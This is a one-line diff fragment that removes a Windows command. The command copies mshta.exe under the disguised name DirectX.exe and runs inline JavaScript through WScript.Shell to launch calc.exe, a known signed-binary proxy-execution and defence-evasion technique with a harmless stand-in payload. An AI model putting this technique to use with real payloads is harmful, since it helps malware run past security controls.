@@ -1,1 +1,0 @@
-copy mshta.exe DirectX.exe && DirectX.exe javascript:a=(new ActiveXObject('WScript.Shell')).Run('calc.exe');window.close();
